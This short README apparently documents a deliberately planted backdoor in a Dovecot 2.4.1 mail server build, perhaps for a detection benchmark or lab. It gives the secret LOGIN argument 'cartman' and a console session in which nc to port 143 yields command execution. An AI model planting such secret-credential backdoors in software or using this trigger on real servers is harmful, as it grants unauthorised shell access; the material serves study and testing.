# Dovecot 2.4.1

## Backdoor

The command `LOGIN` with the secret argument `cartman` leads to a reverse shell

### Triggering the backdoor

```console
$ backdoored/dovecot.ori
$ nc 127.0.0.1 143
* OK [CAPABILITY IMAP4rev1 LOGIN-REFERRALS ID ENABLE IDLE SASL-IR LITERAL+ STARTTLS AUTH=PLAIN] Dovecot ready.
A LOGIN cartman my-neighbor-cthulhu
echo Mouhahahah
Mouhahahah
```